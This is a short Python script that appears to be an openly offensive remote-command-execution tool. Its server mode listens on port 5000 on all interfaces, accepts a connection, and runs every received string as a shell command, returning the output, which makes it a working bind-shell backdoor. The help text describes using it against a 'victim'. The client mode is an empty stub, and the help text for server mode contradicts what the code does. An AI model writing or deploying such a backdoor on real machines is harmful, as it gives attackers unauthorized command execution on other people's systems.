from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from sys import argv

def rceServerMode():
    server_address = ('0.0.0.0', 5000)

    server_socket = socket()
    server_socket.bind(server_address)
    server_socket.listen(1)
    
    client_socket, client_address = server_socket.accept()

    estado = True
    while estado:
        comando = client_socket.recv(4096).decode()

        if comando == 'exit':
            client_socket.close()
            server_socket.close()
            estado = False
        
        elif comando.split(" ")[0] == 'cd':
            chdir(" ".join(comando.split(" ")[1:]))
            client_socket.send("ruta actual: {}".format(getcwd()).encode())
        
        else :
            salida = getoutput(comando)
            client_socket.send(salida.encode())
            
def rceClientMode():
    pass
    
def showOptions():
    print("-s >> Set RCE as server mode (the victim make a connection to you)\n"
          "-c >> Set RCE as client mode (the victim is the server host, you connect to him)")

if __name__ == "__main__":
    # python cmd -s
    if argv[1] in '-s':
        rceServerMode()
        
    elif argv[1] in '-c':
        rceClientMode()
        
    elif argv[1] in '-h':
        showOptions()
        
    
    
    

    
